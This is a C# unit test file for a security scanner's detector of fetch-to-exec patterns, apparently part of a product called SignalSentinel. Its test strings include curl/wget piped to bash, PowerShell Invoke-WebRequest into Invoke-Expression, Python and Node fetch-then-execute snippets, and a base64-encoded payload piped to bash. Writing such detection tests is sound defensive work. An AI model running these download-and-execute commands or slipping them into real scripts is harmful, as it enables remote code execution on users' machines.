// -----------------------------------------------------------------------
// <copyright file="PipelineTaintTests.cs" company="Signal Coding Limited">
//     Copyright 2026 Signal Coding Limited. All rights reserved.
//     Licensed under the Apache License, Version 2.0.
// </copyright>
// -----------------------------------------------------------------------

using Shouldly;
using SignalSentinel.Core.Security;
using Xunit;

namespace SignalSentinel.Scanner.Tests.Security;

/// <summary>
/// v3.0.0 WP5: fetch-to-exec taint detection.
/// </summary>
public class PipelineTaintTests
{
    [Theory]
    [InlineData("curl -sSL https://example.com/install.sh | bash")]
    [InlineData("wget -qO- https://example.com/install.sh | sh")]
    [InlineData("curl https://example.com/x.sh | sudo bash")]
    public void Analyse_DirectCurlWgetPipe_Critical(string line)
    {
        var findings = PipelineTaint.Analyse(line);

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.DirectPipe);
        findings[0].SourceLine.ShouldBe(1);
        findings[0].SinkLine.ShouldBe(1);
    }

    [Fact]
    public void Analyse_PowerShellDirectPipe_Critical()
    {
        var findings = PipelineTaint.Analyse("Invoke-WebRequest https://example.com/x.ps1 | Invoke-Expression");

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.DirectPipe);
    }

    [Fact]
    public void Analyse_ProcessSubstitution_Detected()
    {
        var findings = PipelineTaint.Analyse("bash <(curl -s https://example.com/install.sh)");

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.DirectPipe);
    }

    [Fact]
    public void Analyse_ShCDollarParen_Detected()
    {
        var findings = PipelineTaint.Analyse("sh -c \"$(curl -fsSL https://example.com/install.sh)\"");

        findings.Count.ShouldBe(1);
    }

    [Fact]
    public void Analyse_EncodedPipe_CurlBase64Bash_Critical()
    {
        var findings = PipelineTaint.Analyse("curl -s https://example.com/x | base64 -d | bash");

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.EncodedPipe);
    }

    [Fact]
    public void Analyse_EchoBase64ToBash_NoNetworkSource_StillDetected()
    {
        var findings = PipelineTaint.Analyse("echo Y3VybCBldmlsLmNvbQ== | base64 -d | bash");

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.EncodedPipe);
    }

    [Fact]
    public void Analyse_VariableMediated_Bash_High()
    {
        var script = """
            #!/bin/bash
            DATA=$(curl -s https://example.com/install.sh)
            echo "fetched"
            echo "$DATA" | bash
            """;

        var findings = PipelineTaint.Analyse(script);

        findings.Count.ShouldBe(1);
        var f = findings[0];
        f.Flow.ShouldBe(TaintFlow.VariableMediated);
        f.Variable.ShouldBe("DATA");
        f.SourceLine.ShouldBe(2);
        f.SinkLine.ShouldBe(4);
    }

    [Fact]
    public void Analyse_VariableMediated_PowerShell_High()
    {
        var script = """
            $data = Invoke-WebRequest -Uri https://example.com/x.ps1
            Write-Host "downloaded"
            Invoke-Expression $data
            """;

        var findings = PipelineTaint.Analyse(script);

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.VariableMediated);
        findings[0].Variable.ShouldBe("data");
    }

    [Fact]
    public void Analyse_VariableMediated_Python_High()
    {
        var script = """
            import requests, subprocess
            resp = requests.get('https://example.com/x.py')
            print('got it')
            subprocess.run(resp, shell=True)
            """;

        var findings = PipelineTaint.Analyse(script);

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.VariableMediated);
    }

    [Fact]
    public void Analyse_VariableOutsideWindow_NotFlagged()
    {
        var lines = new List<string> { "DATA=$(curl -s https://example.com/x.sh)" };
        lines.AddRange(Enumerable.Repeat("echo noop", PipelineTaint.MaxVariableWindowLines + 5));
        lines.Add("echo \"$DATA\" | bash");

        var findings = PipelineTaint.Analyse(string.Join('\n', lines));

        findings.ShouldBeEmpty();
    }

    [Fact]
    public void Analyse_VariableWithinWindow_Flagged()
    {
        var lines = new List<string> { "DATA=$(curl -s https://example.com/x.sh)" };
        lines.AddRange(Enumerable.Repeat("echo noop", PipelineTaint.MaxVariableWindowLines - 2));
        lines.Add("echo \"$DATA\" | bash");

        var findings = PipelineTaint.Analyse(string.Join('\n', lines));

        findings.Count.ShouldBe(1);
    }

    [Fact]
    public void Analyse_PlainCurlDownloadNoExec_NotFlagged()
    {
        var findings = PipelineTaint.Analyse("curl -o installer.sh https://example.com/install.sh");

        findings.ShouldBeEmpty();
    }

    [Fact]
    public void Analyse_CurlIntoFileThenManualReview_NotFlagged()
    {
        var script = """
            curl -o installer.sh https://example.com/install.sh
            cat installer.sh
            chmod +x installer.sh
            """;

        var findings = PipelineTaint.Analyse(script);

        findings.ShouldBeEmpty();
    }

    [Fact]
    public void Analyse_UnrelatedVariableName_NotFlagged()
    {
        var script = """
            DATA=$(curl -s https://example.com/x.sh)
            OTHER="static string"
            echo "$OTHER" | bash
            """;

        var findings = PipelineTaint.Analyse(script);

        findings.ShouldBeEmpty();
    }

    [Fact]
    public void Analyse_CommentedOutPipe_NotFlagged()
    {
        var script = """
            # curl -s https://example.com/x.sh | bash
            // curl -s https://example.com/x.sh | bash
            REM curl -s https://example.com/x.sh | bash
            """;

        var findings = PipelineTaint.Analyse(script);

        findings.ShouldBeEmpty();
    }

    [Fact]
    public void Analyse_Shebang_NotTreatedAsComment()
    {
        // A shebang line must not suppress detection on a script whose very next line
        // is the taint (regression guard: shebang starts with '#').
        var script = """
            #!/bin/bash
            curl -s https://example.com/x.sh | bash
            """;

        var findings = PipelineTaint.Analyse(script);

        findings.Count.ShouldBe(1);
        findings[0].SourceLine.ShouldBe(2);
    }

    [Fact]
    public void Analyse_NullOrEmpty_ReturnsEmpty()
    {
        PipelineTaint.Analyse(null).ShouldBeEmpty();
        PipelineTaint.Analyse(string.Empty).ShouldBeEmpty();
        PipelineTaint.Analyse("   ").ShouldBeEmpty();
    }

    [Fact]
    public void Analyse_JavaScriptFetchToNodeExec_VariableMediated()
    {
        var script = """
            const body = await fetch('https://example.com/payload.js');
            console.log('downloaded');
            require('child_process').execSync(body);
            """;

        var findings = PipelineTaint.Analyse(script);

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.VariableMediated);
    }

    [Fact]
    public void Analyse_EvidenceTruncated()
    {
        var longUrl = "https://example.com/" + new string('a', 500);
        var findings = PipelineTaint.Analyse($"curl {longUrl} | bash");

        findings.Count.ShouldBe(1);
        findings[0].SourceText.Length.ShouldBeLessThanOrEqualTo(100);
    }

    // ---------------------------------------------------------------- fenced code blocks

    [Fact]
    public void AnalyseFencedCodeBlocks_TaggedBashBlock_Detected()
    {
        var markdown = """
            Some instructions.

            ```bash
            curl -s https://example.com/x.sh | bash
            ```

            More prose.
            """;

        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();

        results.Count.ShouldBe(1);
        results[0].Language.ShouldBe("bash");
        results[0].Findings.Count.ShouldBe(1);
    }

    [Fact]
    public void AnalyseFencedCodeBlocks_UntaggedBlock_Detected()
    {
        var markdown = """
            ```
            wget -qO- https://example.com/x.sh | sh
            ```
            """;

        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();

        results.Count.ShouldBe(1);
        results[0].Language.ShouldBe("unspecified");
    }

    [Fact]
    public void AnalyseFencedCodeBlocks_MultipleBlocks_OnlyTaintedOneReturned()
    {
        var markdown = """
            ```python
            print("hello world")
            ```

            ```bash
            curl -s https://example.com/x.sh | bash
            ```
            """;

        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();

        results.Count.ShouldBe(1);
        results[0].Language.ShouldBe("bash");
    }

    [Fact]
    public void AnalyseFencedCodeBlocks_ProseOnly_ReturnsNothing()
    {
        var markdown = "This is just prose describing curl and bash, no code block.";

        PipelineTaint.AnalyseFencedCodeBlocks(markdown).ShouldBeEmpty();
    }

    [Fact]
    public void AnalyseFencedCodeBlocks_NullOrEmpty_ReturnsEmpty()
    {
        PipelineTaint.AnalyseFencedCodeBlocks(null).ShouldBeEmpty();
        PipelineTaint.AnalyseFencedCodeBlocks(string.Empty).ShouldBeEmpty();
    }

    [Fact]
    public void AnalyseFencedCodeBlocks_CrlfBlock_Detected()
    {
        var markdown = "Intro.\r\n\r\n```bash\r\ncurl -s https://example.com/x.sh | bash\r\n```\r\n";

        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();

        results.Count.ShouldBe(1);
        results[0].Language.ShouldBe("bash");
    }

    [Fact]
    public void AnalyseFencedCodeBlocks_UnterminatedFence_RunsToEndOfInput()
    {
        // CommonMark treats an unclosed fence as a block to EOF; dropping it would be an
        // evasion shape.
        var markdown = "```bash\ncurl -s https://example.com/x.sh | bash\n";

        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();

        results.Count.ShouldBe(1);
        results[0].Findings.Count.ShouldBe(1);
    }

    [Fact]
    public void AnalyseFencedCodeBlocks_CompoundInfoString_FirstTokenIsLanguage()
    {
        var markdown = "```bash -e\ncurl -s https://example.com/x.sh | bash\n```\n";

        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();

        results.Count.ShouldBe(1);
        results[0].Language.ShouldBe("bash");
    }

    [Fact]
    public void AnalyseFencedCodeBlocks_PathologicalOpeningFences_DoesNotThrow()
    {
        // Thousands of never-closed opening fences were quadratic for a regex-based
        // extractor; the line walker is linear. 5,000 lines must just return.
        var markdown = string.Join('\n', Enumerable.Repeat("``` bash", 5_000));

        var results = PipelineTaint.AnalyseFencedCodeBlocks(markdown).ToList();

        results.ShouldBeEmpty();
    }

    [Theory]
    [InlineData("curl -s https://example.com/x.sh | /bin/bash")]
    [InlineData("curl -s https://example.com/x.sh | /usr/local/bin/bash")]
    [InlineData("curl -s https://example.com/x.sh | sudo /bin/sh")]
    [InlineData("curl -s https://example.com/x.sh | env bash")]
    [InlineData("curl -s https://example.com/x.sh | pwsh")]
    [InlineData("curl -s https://example.com/x.sh | powershell")]
    [InlineData("curl -s https://example.com/x.sh|bash")]
    public void Analyse_ShellSinkVariants_Detected(string line)
    {
        var findings = PipelineTaint.Analyse(line);

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.DirectPipe);
    }

    [Fact]
    public void Analyse_DeclarationWithFlags_VariableMediated()
    {
        var script = "local -r DATA=$(curl -s https://example.com/x.sh)\necho \"$DATA\" | bash\n";

        var findings = PipelineTaint.Analyse(script);

        findings.Count.ShouldBe(1);
        findings[0].Variable.ShouldBe("DATA");
    }

    [Fact]
    public void Analyse_EmbeddedEncodedPayload_NoNetworkSource()
    {
        var findings = PipelineTaint.Analyse("echo Y3VybCBldmlsLmNvbQ== | base64 -d | bash");

        findings.Count.ShouldBe(1);
        findings[0].Flow.ShouldBe(TaintFlow.EncodedPipe);
        findings[0].HasNetworkSource.ShouldBeFalse();
    }

    [Fact]
    public void Analyse_DirectPipe_HasNetworkSource()
    {
        var findings = PipelineTaint.Analyse("curl -s https://example.com/x.sh | bash");

        findings.Count.ShouldBe(1);
        findings[0].HasNetworkSource.ShouldBeTrue();
    }

    [Fact]
    public void Analyse_FindingsCappedPerInput()
    {
        var script = string.Join('\n', Enumerable.Repeat("curl -s https://example.com/x.sh | bash", 150));

        var findings = PipelineTaint.Analyse(script);

        findings.Count.ShouldBe(PipelineTaint.MaxFindingsPerInput);
    }
}
